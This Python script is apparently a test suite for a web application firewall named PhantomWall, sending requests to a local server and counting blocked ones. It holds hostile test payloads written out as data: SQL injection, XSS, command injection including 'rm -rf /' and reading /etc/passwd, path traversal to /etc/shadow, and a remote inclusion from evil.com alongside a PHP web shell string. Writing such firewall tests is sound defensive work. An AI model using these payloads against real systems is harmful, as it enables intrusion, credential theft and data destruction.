import requests
import sys
import time
import json
from urllib.parse import urlencode


class WAFTester:
    def __init__(self, base_url="http://127.0.0.1:8080"):
        self.base_url = base_url.rstrip("/")
        self.results = []
    
    def run_all_tests(self):
        print("=" * 60)
        print("PhantomWall WAF Detection Test Suite")
        print("=" * 60)
        print()
        
        self.test_sql_injection()
        self.test_xss()
        self.test_command_injection()
        self.test_path_traversal()
        self.test_file_inclusion()
        self.test_csrf_protection()
        self.test_rate_limiting()
        self.test_whitelist_blacklist()
        
        self.print_summary()
    
    def send_request(self, method, path, data=None, headers=None):
        url = f"{self.base_url}{path}"
        headers = headers or {}
        
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            elif method == "POST":
                response = requests.post(url, data=data, headers=headers, timeout=5)
            else:
                response = requests.request(method, url, data=data, headers=headers, timeout=5)
            return response
        except requests.RequestException as e:
            print(f"  [ERROR] Request failed: {e}")
            return None
    
    def record_result(self, test_name, detected, expected=True, details=""):
        passed = detected == expected
        status = "PASS" if passed else "FAIL"
        
        self.results.append({
            "test": test_name,
            "status": status,
            "detected": detected,
            "expected": expected,
            "details": details
        })
        
        icon = "✓" if passed else "✗"
        print(f"  [{icon}] {test_name}: {status}")
        if details:
            print(f"      Details: {details}")
    
    def test_sql_injection(self):
        print("[TEST] SQL Injection Detection")
        
        payloads = [
            ("POST", "/backend/login", {"username": "admin' OR '1'='1", "password": "test"}),
            ("GET", "/backend/search?q=1' UNION SELECT * FROM users--", None),
            ("POST", "/backend/login", {"username": "admin'; DROP TABLE users;--", "password": "x"}),
        ]
        
        detected_count = 0
        for method, path, data in payloads:
            response = self.send_request(method, path, data)
            if response is not None and response.status_code == 403:
                detected_count += 1
        
        self.record_result("SQL Injection", detected_count > 0, True, 
                          f"Blocked {detected_count}/{len(payloads)} attempts")
        print()
    
    def test_xss(self):
        print("[TEST] Cross-Site Scripting Detection")
        
        payloads = [
            ("GET", '/backend/search?q=<script>alert("xss")</script>', None),
            ("GET", '/backend/page?data=<img src=x onerror=alert(1)>', None),
            ("POST", "/backend/comment", {"text": "<svg onload=alert('xss')>"}),
        ]
        
        detected_count = 0
        for method, path, data in payloads:
            response = self.send_request(method, path, data)
            if response is not None and response.status_code == 403:
                detected_count += 1
        
        self.record_result("XSS", detected_count > 0, True,
                          f"Blocked {detected_count}/{len(payloads)} attempts")
        print()
    
    def test_command_injection(self):
        print("[TEST] Command Injection Detection")
        
        payloads = [
            ("POST", "/backend/cmd", {"cmd": "cat /etc/passwd"}),
            ("GET", "/backend/exec?cmd=; rm -rf /", None),
            ("POST", "/backend/run", {"command": "$(whoami)"}),
        ]
        
        detected_count = 0
        for method, path, data in payloads:
            response = self.send_request(method, path, data)
            if response is not None and response.status_code == 403:
                detected_count += 1
        
        self.record_result("Command Injection", detected_count > 0, True,
                          f"Blocked {detected_count}/{len(payloads)} attempts")
        print()
    
    def test_path_traversal(self):
        print("[TEST] Path Traversal Detection")
        
        payloads = [
            ("GET", "/backend/download?file=../../../etc/passwd", None),
            ("GET", "/backend/file?path=..\\..\\windows\\system32\\config\\sam", None),
            ("GET", "/backend/img?src=....//....//etc/shadow", None),
        ]
        
        detected_count = 0
        for method, path, data in payloads:
            response = self.send_request(method, path, data)
            if response is not None and response.status_code == 403:
                detected_count += 1
        
        self.record_result("Path Traversal", detected_count > 0, True,
                          f"Blocked {detected_count}/{len(payloads)} attempts")
        print()
    
    def test_file_inclusion(self):
        print("[TEST] File Inclusion Detection")
        
        payloads = [
            ("GET", "/backend/page?file=http://evil.com/shell.txt", None),
            ("GET", "/backend/view?include=php://filter/read=convert.base64-encode/resource=config.php", None),
            ("GET", "/backend/load?document=data://text/plain,<?php system($_GET[cmd]); ?>", None),
        ]
        
        detected_count = 0
        for method, path, data in payloads:
            response = self.send_request(method, path, data)
            if response is not None and response.status_code == 403:
                detected_count += 1
        
        self.record_result("File Inclusion", detected_count > 0, True,
                          f"Blocked {detected_count}/{len(payloads)} attempts")
        print()
    
    def test_csrf_protection(self):
        print("[TEST] CSRF Protection Headers")

        # Requests carrying a CSRF-protection header must pass through
        response = self.send_request(
            "POST",
            "/backend/users",
            {"name": "test"},
            headers={"X-Requested-With": "XMLHttpRequest"}
        )

        allowed = response is not None and response.status_code != 403
        self.record_result("CSRF Allowed", allowed, True,
                          "Requests with CSRF protection headers are allowed")
        print()
    
    def test_rate_limiting(self):
        print("[TEST] Rate Limiting")
        
        path = "/backend/api/data"
        request_count = 110
        blocked_count = 0
        
        print(f"  Sending {request_count} rapid requests...")
        
        for i in range(request_count):
            response = self.send_request("GET", path)
            if response is not None and response.status_code == 429:
                blocked_count += 1
                break
            time.sleep(0.01)
        
        self.record_result("Rate Limiting", blocked_count > 0, True,
                          f"Rate limit triggered after ~100 requests")
        print()
    
    def test_whitelist_blacklist(self):
        print("[TEST] IP Whitelist/Blacklist")
        
        print("  (Note: Manual testing required for IP-based rules)")
        print("  - Add IP to whitelist via dashboard")
        print("  - Add IP to blacklist via dashboard")
        print("  - Verify requests are handled correctly")
        
        self.record_result("IP Lists", True, True, "Configuration-based")
        print()
    
    def print_summary(self):
        print("=" * 60)
        print("Test Summary")
        print("=" * 60)
        
        passed = sum(1 for r in self.results if r["status"] == "PASS")
        failed = sum(1 for r in self.results if r["status"] == "FAIL")
        total = len(self.results)
        
        print(f"Total Tests: {total}")
        print(f"Passed: {passed}")
        print(f"Failed: {failed}")
        print(f"Success Rate: {passed/total*100:.1f}%")
        print()
        
        if failed > 0:
            print("Failed Tests:")
            for r in self.results:
                if r["status"] == "FAIL":
                    print(f"  - {r['test']}: {r['details']}")
            print()
        
        print("=" * 60)


def demo_attack_simulation():
    print("=" * 60)
    print("PhantomWall Attack Simulation Demo")
    print("=" * 60)
    print()
    print("This demo shows how PhantomWall detects various attacks.")
    print("Make sure PhantomWall is running on http://127.0.0.1:8080")
    print()
    
    base_url = "http://127.0.0.1:8080"
    
    attacks = [
        ("SQL Injection", "/api/simulate/sqli"),
        ("XSS", "/api/simulate/xss"),
        ("Command Injection", "/api/simulate/cmd"),
        ("Path Traversal", "/api/simulate/path"),
    ]
    
    for name, path in attacks:
        print(f"[SIMULATION] {name}")
        try:
            response = requests.get(f"{base_url}{path}", timeout=5)
            result = response.json()
            
            status = "BLOCKED" if result.get("blocked") else "ALLOWED"
            detected = "YES" if result.get("detected") else "NO"
            
            print(f"  Status: {status}")
            print(f"  Detected: {detected}")
            print(f"  Rule: {result.get('rule_triggered', 'N/A')}")
            print()
            
            time.sleep(0.5)
        except Exception as e:
            print(f"  [ERROR] {e}")
            print()


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="PhantomWall Test Suite")
    parser.add_argument("--url", default="http://127.0.0.1:8080", help="Base URL")
    parser.add_argument("--demo", action="store_true", help="Run attack simulation demo")
    
    args = parser.parse_args()
    
    if args.demo:
        demo_attack_simulation()
    else:
        tester = WAFTester(args.url)
        tester.run_all_tests()


if __name__ == "__main__":
    main()
